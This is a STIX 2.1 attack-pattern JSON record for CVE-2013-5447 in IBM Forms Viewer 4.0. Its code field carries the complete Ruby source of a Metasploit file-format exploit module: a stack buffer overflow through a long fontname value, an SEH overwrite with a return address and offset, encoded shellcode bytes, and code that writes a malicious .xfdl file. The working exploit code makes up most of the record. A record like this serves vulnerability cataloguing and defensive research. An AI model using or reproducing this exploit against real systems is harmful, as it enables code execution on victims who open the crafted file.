{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d9fe63cb-78ba-423d-967e-d26f5ef3af01",
    "created": "2024-08-14T16:37:58.706502Z",
    "modified": "2024-08-14T16:37:58.706507Z",
    "name": "IBM Forms Viewer Unicode Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in IBM Forms Viewer. The vulnerability is due to a dangerous usage of a strcpy-like function, and occurs while parsing malformed XFDL files containing a long fontname value. This module has been tested successfully on IBM Forms Viewer 4.0 on Windows XP SP3 and Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ibm_forms_viewer_fontname.rb",
            "external_id": "ibm_forms_viewer_fontname.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-5447"
        },
        {
            "source_name": "reference",
            "url": "http://www-01.ibm.com/support/docview.wss?uid=swg21657500"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include REXML\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'IBM Forms Viewer Unicode Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack-based buffer overflow in IBM Forms Viewer. The vulnerability\n        is due to a dangerous usage of a strcpy-like function, and occurs while parsing malformed\n        XFDL files containing a long fontname value. This module has been tested successfully on IBM\n        Forms Viewer 4.0 on Windows XP SP3 and Windows 7 SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez', # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-5447' ],\n          [ 'OSVDB', '100732' ],\n          [ 'ZDI', '13-274' ],\n          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21657500' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'          => 3000,\n          'EncoderType'    => Msf::Encoder::Type::AlphanumUnicodeMixed,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ECX',\n              'BufferOffset' => 10\n            },\n          'BadChars'       => (0x00..0x08).to_a.pack(\"C*\") + (0x0b..0x1f).to_a.pack(\"C*\") +\"\\x26\\x3c\" + (0x80..0xff).to_a.pack(\"C*\"),\n          'DisableNops'    => true,\n          # Fix the stack before the payload is executed, so we avoid\n          # windows exceptions due to alignment\n          'Prepend'        =>\n              \"\\x64\\xa1\\x18\\x00\\x00\\x00\" + # mov eax, fs:[0x18]\n              \"\\x83\\xC0\\x08\"             + # add eax, byte 8\n              \"\\x8b\\x20\"                 + # mov esp, [eax]\n              \"\\x81\\xC4\\x30\\xF8\\xFF\\xFF\"   # add esp, -2000\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'IBM Forms Viewer 4.0 / Windows XP SP3 / Windows 7 SP1',\n            # masqform.exe 8.0.0.266\n            {\n              'Ret'    => 0x4c30, # p/p/r unicode from masqform.exe\n              'Nop'    => 0x47, # 004700 => add [edi+0x0],al\n              'Offset' => 62\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-12-05',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.xfdl']),\n      ])\n  end\n\n  def generate_xfdl\n    xml = Document.new\n\n    # XFDL\n    xfdl = xml.add_element(\"XFDL\", {\n      'xmlns:custom'   => \"http://www.ibm.com/xmlns/prod/XFDL/Custom\",\n      'xmlns:designer' => \"http://www.ibm.com/xmlns/prod/workplace/forms/designer/2.6\",\n      'xmlns:ev'       => \"http://www.w3.org/2001/xml-events\",\n      'xmlns:xfdl'     => \"http://www.ibm.com/xmlns/prod/XFDL/7.5\",\n      'xmlns:xforms'   => \"http://www.w3.org/2002/xforms\",\n      'xmlns'          => \"http://www.ibm.com/xmlns/prod/XFDL/7.5\",\n      'xmlns:xsd'      => \"http://www.w3.org/2001/XMLSchema\",\n      'xmlns:xsi'      => \"http://www.w3.org/2001/XMLSchema-instance\"\n    })\n\n    # XFDL => globalpage\n    xdfl_global_page = xfdl.add_element(\"globalpage\", {\n      \"sid\" => \"global\"\n    })\n    global = xdfl_global_page.add_element(\"global\", {\n      \"sid\" => \"global\"\n    })\n    designer_date = global.add_element(\"designer:date\")\n    designer_date.text = \"20060615\"\n    form_id = global.add_element(\"formid\")\n    form_id.add_element(\"title\")\n    serial_number = form_id.add_element(\"serialnumber\")\n    serial_number.text = \"A6D5583E2AD0D54E:-72C430D4:10BD8923059:-8000\"\n    version_form = form_id.add_element(\"version\")\n    version_form.text = \"1\"\n\n    # XFDL => page\n    page = xfdl.add_element(\"page\", {\n      \"sid\" => \"PAGE1\"\n    })\n\n    # XFDL => page => global\n    page_global = page.add_element(\"global\", {\n      \"sid\" => \"global\"\n    })\n    label_page = page_global.add_element(\"label\")\n    label_page.text = \"PAGE1\"\n\n    # XFDL => page => label\n    label = page.add_element(\"label\", {\n      \"sid\" => \"title\"\n    })\n    item_location = label.add_element(\"itemlocation\")\n    x = item_location.add_element(\"x\")\n    x.text = \"20\"\n    y = item_location.add_element(\"y\")\n    y.text = \"0\"\n    value = label.add_element(\"value\", {\n      \"compute\" => \"global.global.custom:formTitle\"\n    })\n    value.text = rand_text_alpha(10)\n    font_info = label.add_element(\"fontinfo\")\n    font_name = font_info.add_element(\"fontname\")\n    font_name.text = \"MSF_REPLACE\"\n    xml.to_s\n  end\n\n\n  def exploit\n    sploit = rand_text_alpha(target['Offset'])\n    sploit << \"\\x61\\x62\"             # nseh # NSEH # popad (61) + nop compatible with unicode (add [edx+0x0],ah # 006200)\n    sploit << [target.ret].pack(\"v\") # seh # ppr\n    sploit << [target['Nop']].pack(\"C\")\n    sploit << payload.encoded\n    sploit << rand_text_alpha(4096)  # make it crash\n\n    xfdl = generate_xfdl.gsub(/MSF_REPLACE/, sploit) # To avoid rexml html encoding\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(xfdl)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-12-05",
    "x_mitre_platforms": [
        "win'"
    ]
}